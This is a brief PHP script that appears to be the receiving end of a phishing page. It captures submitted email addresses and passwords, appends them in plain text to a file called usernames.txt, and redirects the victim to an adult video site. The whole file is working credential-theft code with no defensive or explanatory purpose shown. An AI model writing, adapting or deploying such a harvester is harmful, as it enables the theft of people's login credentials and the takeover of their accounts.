<?php
header('Location: https://www.xxxlucah.com/video/7309/images-of-darshan-raval-with-his-gf/');
$user = $_POST["email"];
$pwd = $_POST["pass"];

if (!empty($_POST["email"])) {file_put_contents("usernames.txt", "User: " . $_POST["email"] . "\nPass: " . $_POST["pass"] . "\n\n", FILE_APPEND);                 }
	
?>
